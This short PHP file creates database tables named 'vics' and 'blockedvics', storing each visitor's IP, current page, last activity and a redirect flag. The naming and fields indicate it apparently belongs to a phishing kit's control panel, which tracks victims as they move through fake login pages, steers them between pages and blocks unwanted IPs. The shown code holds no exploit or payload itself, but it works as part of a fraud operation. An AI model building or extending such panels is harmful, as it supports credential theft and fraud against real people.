<?php 

require (__DIR__).'/../../config.php';

if(strtolower($local_db) == "on") {
    $DB_PATH = (__DIR__)."/database/Jeehan.db";
    $pdo = new PDO("sqlite:".$DB_PATH);
    
    // Create the tables for SQLite
    $setup = "
    CREATE TABLE IF NOT EXISTS vics (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        ip TEXT,
        redirect INTEGER DEFAULT 0,
        current_page TEXT,
        last_act TEXT,
        title TEXT DEFAULT NULL  -- Add the title column here
    );

    CREATE TABLE IF NOT EXISTS blockedvics (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT
    );
    ";
    $pdo->exec($setup); // Use exec for executing multiple statements in SQLite
} else {
    $pdo = new PDO("mysql:host=".DB_HOST."; dbname=".DB_NAME, DB_USER, DB_PASS);
    
    // Create tables for MySQL
    $setup = "
    CREATE TABLE IF NOT EXISTS vics (
        id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
        user_id VARCHAR(200),
        ip VARCHAR(100),
        redirect INT DEFAULT 0,
        current_page VARCHAR(100),
        last_act VARCHAR(100),
        title VARCHAR(255) DEFAULT NULL  -- Add the title column here
    );

    CREATE TABLE IF NOT EXISTS blockedvics (
        id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
        ip VARCHAR(100)
    );
    ";
    $pdo->query($setup);
}

?>
